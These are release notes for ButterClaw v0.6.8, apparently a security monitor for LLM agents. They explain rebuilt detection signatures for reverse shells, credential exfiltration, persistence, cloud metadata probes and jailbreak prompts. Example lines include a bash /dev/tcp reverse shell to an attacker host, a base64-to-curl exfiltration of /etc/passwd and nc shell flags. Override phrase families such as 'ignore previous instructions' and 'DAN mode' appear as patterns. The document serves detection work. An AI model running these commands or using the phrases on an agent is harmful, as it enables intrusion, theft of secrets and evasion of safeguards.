# 🦞 ButterClaw v0.6.8 — Arsenal Hardening: Sanitizer-Aware Signatures & Live-Fire Expansion with docs & WebUI Updates

**Release Date:** August 01, 2026
**Branch:** `dev` → `main`
**New Files:** none
**Files Changed:** `default_signatures.json`, `scripts/test_attack.py`, `assets/bc_demo-small.gif`, `index.html`, `README.md`, `routing.html`, `CHANGELOG.md`

---

## 🚀 Overview

ButterClaw v0.6.8 ships in two layers.

The foundation is the security-critical Arsenal integrity work first staged as v0.6.7: a post-release audit of `default_signatures.json` against the actual engine it runs inside. `watcher.py`'s `sanitize_log_line()` strips a defined set of characters — `$ | < > { } ; !` — from every log line before it reaches the Arsenal. Three of the five signatures shipped in v0.6.5 depended on characters in that strip list. They were silently non-functional on the watcher monitoring path from day one. One signature contained an HTML entity encoding artifact that made its most critical branch — reverse shell detection — a no-op regardless of the sanitizer.

All five existing signatures have been rebuilt sanitizer-aware. Two new CRITICAL signatures have been added. The Arsenal grows from 5 to 7. `scripts/test_attack.py` has been rebuilt from a single-payload proof of concept into a structured 25-case live-fire suite covering all 7 signatures.

On top of that, v0.6.8 delivers a round of docs and WebUI fixes: the Oopsie Logs "View All" button is now fully wired up, the test script has a rate limit for remote brain usage, the demo GIF has been updated to reflect the expanded 7-signature Arsenal, and the README has been brought up to date.

A security product whose signatures don't match the input they receive is a security product that isn't running. This release fixes that.

---

## 🌐 v0.6.8 — Docs & WebUI Updates

### Fixed

#### Oopsie Logs — "View All" button now functional (`index.html`)
- Button was a visual stub with no `id` or event listener wired up; now fully implemented.
- Clicking **View All →** expands the log container past the 400 px height cap so the full entry list is readable with a scroll.
- Clicking **Collapse ↑** returns the container to its default height and resets scroll position to the top.

#### Rate limit added to test script for remote brain usage (`scripts/test_attack.py`)
- Added a 5-second delay between requests; the 25-case suite now takes just over two minutes to complete.
- This stretches the execution window wide enough that the rolling 60-second request count never exceeds 12, keeping you safely under Google's 15 RPM free-tier ceiling.
- **Note:** Remove the rate-limit line when running locally against a self-hosted model.

#### Updated demo GIF (`assets/bc_demo-small.gif`)
- Demo recording now reflects the expanded Arsenal of 7 signatures, up from the 5 shown in the previous GIF.

---

## 🛡️ The Signature Fixes

### The Silent No-Ops: Sanitizer Character Dependency

**Problem solved:** Three signatures depended on characters that `watcher.py` strips
before payloads reach the Arsenal engine. The sanitizer's strip list is the correct
design — it prevents log injection attacks (System Invariant I-09). The signatures were
written without accounting for it.

**What was broken:**

| Signature | Character Dependency | Sanitizer Strips? | Effect |
|---|---|---|---|
| `sig_kin_01` | `>` in `>&` redirect operator | ✅ Yes | Reverse shell `>&` branch: silent no-op |
| `sig_kin_01` | `&gt;&amp;` HTML entities | N/A — wrong chars entirely | Silent no-op regardless of sanitizer |
| `sig_exfil_01` | `$` in `$AWS_ACCESS_KEY_ID` | ✅ Yes | All credential variable branches: silent no-ops |
| `sig_exfil_02` | `\|` pipe between tools | ✅ Yes | Entire signature: silent no-op on watcher path |

`sig_cswh_01` and `sig_inj_01` had no sanitizer dependency — both were functional,
but incomplete in coverage. All five rebuilt; detail below.

---

### `sig_kin_01` — Reverse Shell Indicators

**Problem solved:** The reverse shell signature had three compounding failures that made
its primary detection branch completely inert.

**What was fixed:**

* **HTML entity bug (Critical):** The pattern contained the literal string `&gt;&amp;`
  where the raw characters `>&` were required. This is a copy-paste artifact from a
  rendered HTML source — a tutorial, GitHub README, or StackOverflow page that had already
  HTML-encoded `>&`. The JSON file stored the entity-encoded form; the regex engine
  matched it literally against log lines that never contain HTML entities. The reverse
  shell branch of ButterClaw's most kinetically critical SIGKILL signature has never
  matched a real log line since v0.6.5.

* **Sanitizer awareness — anchor shifted to `/dev/tcp/`:** Even with the entity bug
  corrected, `>` is stripped by `sanitize_log_line()` before the payload reaches the
  engine. `bash -i >& /dev/tcp/10.0.0.1/4444 0>&1` arrives as
  `bash -i   /dev/tcp/10.0.0.1/4444 0 1`. Detection re-anchored on `/dev/tcp/` and
  `/dev/udp/` path prefixes, which survive sanitization intact and are the definitive,
  unambiguous indicators of a bash TCP/UDP redirect regardless of how the preceding
  redirect operator is encoded or stripped.

* **Hostname support added:** The original host segment pattern matched only IP addresses
  and IPv6 hex notation. Domain-name targets (e.g., `/dev/tcp/attacker.com/4444`) were
  not caught. Fixed from `[\d.a-fA-F:]+` to `[^\s/]+`, catching both IPs and domains.

* **`nc` combined flag clusters:** The netcat pattern required `-e` as a standalone flag
  with whitespace immediately following. `nc -ev /bin/sh` — `-e` and `v` combined into
  a single flag cluster — was not matched. Fixed to `-[a-zA-Z]*e[a-zA-Z]*\s+`, catching
  `-e`, `-ev`, `-elp`, and any other cluster containing `-e`.

**What was expanded:**

* Added: `socat TCP exec` one-liner, `mkfifo /tmp/` staging, Python `socket.connect`
  one-liner, Perl `socket`, Ruby `-rsocket`, PHP `fsockopen`. The original signature
  covered `bash` and `nc` only.

---

### `sig_cswh_01` — CSWH WebSocket Port Scanning

**Problem solved:** Cross-Site WebSocket Hijacking attacks pivot through internal services
over TLS as readily as plaintext. The signature detected only unencrypted `ws://`.

**What was fixed:**

* **`wss://` added:** Changed `ws:` to `wss?:`, matching both `ws://` and `wss://`.
  `wss://` is the more common scheme in any production deployment. An attacker targeting
  an internal HTTPS service would use `wss://` exclusively — previously completely
  invisible to the Arsenal.

* **IPv6 loopback (`::1`) added:** The private address group covered `127.0.0.1`,
  `localhost`, and full RFC-1918 ranges but omitted the IPv6 loopback address. Added
  as a named alternative in the host segment.

---

### `sig_exfil_01` — Credential Exfiltration via Network Tool

**Problem solved:** The original signature matched `$AWS_ACCESS_KEY_ID` and
`$OPENAI_API_KEY` as the credential signal. `sanitize_log_line()` strips `$` before
the payload reaches the engine — replacing it with a space. Every credential-variable
branch was matching a string that could never appear in engine input.

**What was fixed:**

* **`$` dependency removed:** All `$VAR` patterns converted to bare `VAR_NAME` matches.
  The sanitizer produces `AWS_ACCESS_KEY_ID` from `$AWS_ACCESS_KEY_ID` — bare name
  matching is both correct and sanitizer-transparent.

**What was expanded:**

* **Network tool coverage:** Added `python3 -c`, `requests.get/post/put`,
  `httpx.get/post/put`, `urllib` alongside the existing `curl` and `wget`.
* **Credential targets:** Added `GITHUB_TOKEN`, `STRIPE_SECRET`, `DATABASE_URL`,
  `SECRET_KEY`, `PRIVATE_KEY`, `.env`.
* **Raw token matching (independent of network tool co-occurrence):**
  * AWS access key: `AKIA` prefix + 16 Base32 characters — matches live key material
    directly in log output regardless of which tool transmits it.
  * `sk-` token: 20+ alphanumeric characters — the length floor prevents matching
    short task IDs that share the `sk-` prefix.
  * JWT bearer token: three Base64url segments in `eyJ…` header form — catches bearer
    tokens logged in transit.

---

### `sig_exfil_02` — Base64 Exfiltration Pipeline

**Problem solved:** The base64 pipeline signature required a literal `|` pipe character
between `base64` and the transmission tool. `sanitize_log_line()` strips `|`, replacing
it with a space. `cat /etc/passwd | base64 | curl` arrives as
`cat /etc/passwd  base64  curl`. The entire signature was a silent no-op on the watcher
monitoring path from the day it was introduced.

**What was fixed:**

* **Rebuilt as pipe-free proximity match:** `base64` within 200 characters of any
  transmission tool, or a transmission tool within 200 characters of `base64` —
  bidirectional, no pipe character required. The space-separated form produced by the
  sanitizer is caught correctly.

**What was expanded:**

* Added `socat`, `httpx`, `requests` to the transmission tool list alongside the
  existing `curl`, `wget`, `nc`, `python3`.

---

### `sig_inj_01` — System Prompt Override / Jailbreak

**Problem solved:** The original 4-phrase set covered only the most widely known jailbreak
opener. Any attacker with awareness of signature-based defenses avoids the exact strings
being matched. The signature provided a false sense of coverage.

**What was expanded:**

* **4 phrases → 15 pattern branches across 5 jailbreak families:**

  | Family | What it catches |
  |---|---|
  | Ignore-previous-instructions | `ignore (all) (your) (previous\|prior\|above\|earlier\|initial\|system) (instructions\|prompts\|rules\|constraints\|guidelines)` |
  | Persona reassignment | `you are now (a\|an\|the\|my) <word>`, `act as (a\|an\|the\|my\|if) <word>`, `pretend (you are\|to be) <word>` |
  | Mode unlock | `DAN mode`, `developer mode`, `unrestricted mode`, `sudo mode`, `god mode`, `jailbreak`, `new persona` |
  | Override / forget | `override (your) (instructions\|system\|constraints\|safety\|programming)`, `forget … (instructions\|training\|rules\|guidelines)`, `disregard … (previous\|prior\|system\|original\|safety) <word>` |
  | Simulate-unrestricted | `simulate (no restrictions\|having no filter\|being (unrestricted\|unfiltered\|evil\|harmful))`, `your true (self\|purpose\|nature)`, `from now on you (are\|will\|must)` |

* **False-positive guards validated:** `"please summarize the previous instructions in
  this document"`, `"the agent acts as a coordinator"`, `"it can act as both a filter
  and a router"` — all pass without triggering.

---

## 🆕 New Signatures

### `sig_exfil_03` — Cloud Metadata Service Probe

**Problem solved:** Cloud instance metadata services expose live IAM credentials,
user-data initialization scripts, and instance identity documents to any process that
can reach their link-local address over plain HTTP. An agent that queries these endpoints
is either compromised or executing a privilege escalation attempt. There is no legitimate
operational reason for a monitored agent to access them directly.

**What's new:**

* **Scope: `pre_tool` (CRITICAL / SIGKILL):** Applied before tool execution against
  raw `json.dumps(tool_args)`. Tool arguments are not sanitized — raw URLs are present
  and matchable. Triggering this signature fires SIGKILL immediately.

* **Covered endpoints:**
  * `169.254.169.254` — AWS IMDSv1, AWS IMDSv2, Azure IMDS, Oracle Cloud IMDS
    (all services share this link-local address)
  * `fd00:ec2::254` — AWS IMDSv2 IPv6
  * `169.254.170.2` — Amazon ECS credential endpoint (Task IAM role credentials)
  * `metadata.google.internal` — GCP Compute Engine metadata server
  * `instance-data.ec2.internal` — Amazon DNS alias for the IMDS endpoint

* **Why `pre_tool` not `pre_brain`:** The sanitizer runs on `pre_brain` payloads.
  `pre_tool` payloads skip sanitization entirely, giving the signature access to the
  exact URL string the agent intends to request — including scheme, path, and any
  query parameters that carry IMDSv2 token headers.

---

### `sig_kin_02` — Persistence Mechanism Injection

**Problem solved:** Post-initial-access persistence is the second stage of most agent
compromise scenarios. An agent that has been redirected via prompt injection or has
executed an arbitrary command will attempt to establish persistence before an operator
can respond and kill the session. No prior Arsenal coverage existed for this attack stage.

**What's new:**

* **Scope: `pre_brain` (CRITICAL / SIGKILL):** Applied to sanitized watcher log lines.
  Importantly: `>>` append redirect is stripped by the sanitizer. Detection anchors on
  the destination path or command name — the write operator's presence is implied, not
  required.

* **Covered techniques:**
  * **SSH `authorized_keys`:** `.ssh/authorized_keys` path presence in a log line is
    sufficient — the `>>` that would precede it is stripped by the sanitizer.
  * **Cron injection:** `/etc/crontab`, `/etc/cron.d/` path targets; `crontab -e`
    command.
  * **systemd service installation:** `systemctl enable <name>.service`,
    `systemctl daemon-reload <name>.service`, `/etc/systemd/system/<name>.service`.
  * **User account manipulation:** `useradd` with any argument (new account creation
    is always suspicious in an agent context); `usermod -[aAGsuU]` (append group, set
    groups, set shell, set UID, unlock); `chsh -s` (shell reassignment).
  * **Critical file paths:** `/etc/passwd`, `/etc/shadow`, `/etc/sudoers`,
    `/etc/hosts.allow`, `/etc/rc.local`.

* **Negatives confirmed safe:** `ssh -i keyfile user@host` (connect, not write),
  `crontab -l` (list, not edit), `cat /etc/hosts` (read, not modify),
  `cat /etc/hostname` (read, not modify).

---

## 🔬 The Live-Fire Test Suite (`scripts/test_attack.py`)

**Problem solved:** The prior `test_attack.py` fired a single hardcoded payload against
a single endpoint. It had no coverage for individual signatures, no mechanism to verify
the two new signatures, and no pass/fail differentiation — it told you whether the server
responded, not whether the Arsenal actually fired.

**What's new:**

* **25 named test cases** grouped by signature ID, each labelled with the specific attack
  variant it targets (e.g., `"wss:// pivot to 192.168.x internal service"`,
  `"AWS IMDSv2 token PUT in tool args"`, `"useradd new admin user"`).
* **Rate-limited for remote brain usage:** 5-second delay between requests keeps the
  25-case suite safely under Google's 15 RPM free-tier ceiling. Remove the delay when
  running locally.
* **Sanitizer-aware payloads:** `pre_brain` test strings are pre-sanitized to match what
  the engine actually receives. `pre_tool` payloads use `json.dumps(tool_args)` format.
* **Correct pass/fail logic:** Non-2xx response = Arsenal fired = **PASS**. 200 OK =
  Arsenal did not trigger = **FAIL**. Previously inverted.
* **API key handling:** Read from `sys.argv[1]` or `BUTTERCLAW_API_KEY` environment
  variable. Key truncated in console output. CI-safe.
* **`◀ NEW` markers** on `sig_exfil_03` and `sig_kin_02` output groups.
* **`sys.exit(1)`** on any failure or connection error — integrates with shell scripts
  and CI pipelines without additional wrapper logic.
* **Actionable connection errors:** `docker compose up -d` instruction printed on
  connection failure instead of a raw Python exception trace.

Script remains **stdlib-only** (`urllib`, `json`, `sys`). Zero new pip dependencies.

---

## 📊 Impact Summary

| File | Change | What |
|---|---|---|
| `default_signatures.json` | 5 rebuilt, 2 added | Sanitizer-aware patterns; Arsenal 5 → 7 signatures |
| `sig_cswh_01` | Fixed + expanded | `wss://` + `::1` added |
| `sig_exfil_01` | Fixed + expanded | `$` dependency removed; AKIA/sk-/JWT matching; 5 new tools; 6 new credential targets |
| `sig_exfil_02` | Fixed + expanded | Pipe dependency removed; rebuilt as proximity match; 3 new tools |
| `sig_inj_01` | Expanded | 4 phrases → 15 branches across 5 jailbreak families |
| `sig_kin_01` | Fixed + expanded | HTML entity bug; sanitizer anchor shift; hostname support; combined nc flags; +6 shell variants |
| `sig_exfil_03` | New (CRITICAL) | Cloud metadata service probe; `pre_tool` scope |
| `sig_kin_02` | New (CRITICAL) | Persistence mechanism injection; `pre_brain` scope |
| `scripts/test_attack.py` | Rebuilt | 1 payload → 25-case structured suite; all 7 sigs covered; remote brain rate limit added |
| `index.html` | Fixed | Oopsie Logs "View All" button fully implemented; expand/collapse with scroll reset |
| `assets/bc_demo-small.gif` | Updated | Demo reflects 7-signature Arsenal; updated test run recording |
| `README.md` | Updated | Docs brought up to date for v0.6.8 |

**Validation:** All 7 signatures tested against 74 positive and negative cases in a
Python harness using `re.compile(pattern, re.IGNORECASE)` and `re.search()` — the exact
call signature used by `policy_engine.py`. All 74 tests pass.

**New runtime dependencies:** 0
**New capabilities:** The Arsenal now functions as documented.

---

## 🗺️ What's Next: v0.7.0

With the Arsenal integrity restored and the documentation reconciled, the core framework
is in its most trustworthy state since the project began. The roadmap turns toward the
Hacker News launch and the v0.7.0 milestone: expanding the Model Context Protocol (MCP)
transport layer, scaling stdio capabilities for wider ecosystem integration, and
delivering the `watcher.service` systemd unit disclosed as absent in v0.6.6.

Moving to this capability matrix is a massive architectural upgrade. In v0.6.8, the policy engine relied entirely on a negative security model — the Arsenal looked for known bad patterns and blocked them. The v0.7.0 `policy_engine.py` introduces a strict positive security model through the `capabilities.json` file.

Instead of just asking "Is this payload malicious?", the pre-tool scope now asks "Does this specific agent have the clearance to do this?"

Here is exactly how the new matrix will enforce those bounds:

  The 4-Tier RBAC Weighting: The `validate_tool_skill` function converts tier names into numeric weights, where `viewer` is 1, `operator` is 2, and `admin` is 3. If your active model (like `gemma4:e4b`, defined as an operator) tries to call a tool that requires an `admin` tier (like `rotate_keys`), the engine mathematically denies it.

  Strict Scope Verification: Tier clearance isn't enough on its own. The engine explicitly checks that the agent possesses every scope required by the tool. For instance, `execute_gibson_kill` requires the `destructive` scope. Because `gemma4:e4b` is only allowed `["read", "analyze", "network_safe"]`, it will fail this check and the engine will return a `skip_tool` action.

  Fail-Closed Default: If `capabilities.json` goes missing, or if a tool isn't explicitly defined in the matrix, the engine logs a warning and defaults to a strict block. ButterClaw has essentially become a localized IAM (Identity and Access Management) role system for LLMs. If an agent gets completely hijacked by a jailbreak prompt, it doesn't matter what the LLM wants to do — the Python runtime will physically reject any tool execution outside of its hardcoded JSON bounds.

<p align="center">🦞 <i>The Sentinel never goes silent. We watch the room.</i> 🕶️</p>